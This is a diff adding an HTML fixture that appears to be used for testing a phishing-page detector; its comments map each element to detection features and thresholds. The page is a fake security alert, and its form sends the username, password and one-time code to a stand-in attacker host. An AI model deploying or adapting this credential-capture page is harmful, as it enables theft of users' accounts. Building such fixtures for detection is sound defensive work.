@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Security Alert</title>
+  <!-- External favicon → favicon_is_external -->
+  <link rel="icon" href="https://cdn.example.com/alert-icon.ico">
+  <!-- External stylesheets count toward external resource ratio -->
+  <link rel="stylesheet" href="https://cdn.example.com/overlay-theme.css">
+  <link rel="stylesheet" href="https://cdn.example.com/modal.css">
+</head>
+<body>
+  <h1>Important Security Update Required</h1>
+  <p>We detected unusual activity on your account. Please confirm your credentials below
+  to secure your account and prevent unauthorized access. This verification is required
+  to continue using our services.</p>
+
+  <p>If you did not request this verification, please contact our support team immediately.
+  Your account may be at risk of unauthorized access from an unrecognized device or location.</p>
+
+  <!-- Password form to external domain → password_form_submits_external + has_password_field -->
+  <form action="https://evil-phish.example.com/capture" method="POST">
+    <input type="text" name="username" placeholder="Username or email">
+    <input type="password" name="password" placeholder="Password">
+    <input type="text" name="otp" placeholder="Verification code">
+    <button type="submit">Confirm Identity</button>
+  </form>
+
+  <!-- 8 null links → null_links_excessive (threshold > 5) -->
+  <nav>
+    <a href="#">Terms of Service</a>
+    <a href="javascript:void(0)">Privacy Policy</a>
+    <a href="#">Help Center</a>
+    <a href="">Contact Us</a>
+    <a href="#">FAQ</a>
+    <a href="javascript:void(0)">Security Info</a>
+    <a href="#">About</a>
+    <a href="#">Status</a>
+  </nav>
+
+  <!-- External images push external resource ratio > 80% -->
+  <!-- 6 external resources (2 CSS above + 4 images) vs 1 local = 86% external -->
+  <img src="https://cdn.example.com/warning-banner.png" alt="warning">
+  <img src="https://cdn.example.com/lock-icon.png" alt="secure">
+  <img src="https://cdn.example.com/brand-logo.png" alt="logo">
+  <img src="https://cdn.example.com/trust-badge.png" alt="trusted">
+  <img src="/local-spacer.png" alt="">
+
+  <!-- Hidden iframes → hidden_iframes -->
+  <iframe src="about:blank" style="display:none"></iframe>
+  <iframe src="about:blank" style="visibility:hidden;width:0;height:0"></iframe>
+  <iframe src="about:blank" style="display:none"></iframe>
+</body>
+</html>
